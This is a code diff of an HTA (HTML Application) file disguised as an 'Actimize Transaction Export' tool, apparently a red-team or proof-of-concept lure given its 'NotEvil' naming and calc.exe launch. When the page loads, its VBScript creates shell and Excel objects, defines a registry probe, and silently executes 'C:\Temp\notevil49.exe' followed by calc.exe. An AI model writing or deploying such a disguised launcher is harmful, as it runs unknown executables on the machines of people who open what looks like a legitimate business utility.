@@ -1,4 +1,30 @@
-<script language="VBScript">
+<!DOCTYPE HTML>
+
+<html>
+	<head>
+		<meta http-equiv="x-ua-compatible" content="IE=9">
+		<title>Actimize Transaction Export</title>
+		<HTA:APPLICATION ID = "oHTA"
+			APPLICATIONNAME = "NotEvil"
+			MAXIMIZEBUTTON = "no"
+			SINGLEINSTANCE = "yes"
+			SCROLL = "no"
+		/>
+		<script language="VBScript">
+			Dim WshShell, RegPath, action, objWorkbook, xlmodule
+			Set objExcel = CreateObject("Excel.Application")
+			
+			Set WshShell = CreateObject("WScript.Shell")
+				function RegExists(regKey)
+				on error resume next
+				WshShell.RegRead regKey
+				RegExists = (Err.number = 0)
+			end function
+		</script>
+		
+	</head>
+	<body>
+		<script language="VBScript">
 	Dim objResult 
     Set WshShell = CreateObject("WScript.Shell")
     Set objResult = WshShell.Exec("C:\Temp\notevil49.exe")
@@ -7,3 +33,9 @@
     Set WshShell = CreateObject("WScript.Shell")
     Set objResult = WshShell.Exec("calc.exe")
 </script>
+	   
+	</body>
+</html>
+
+
+
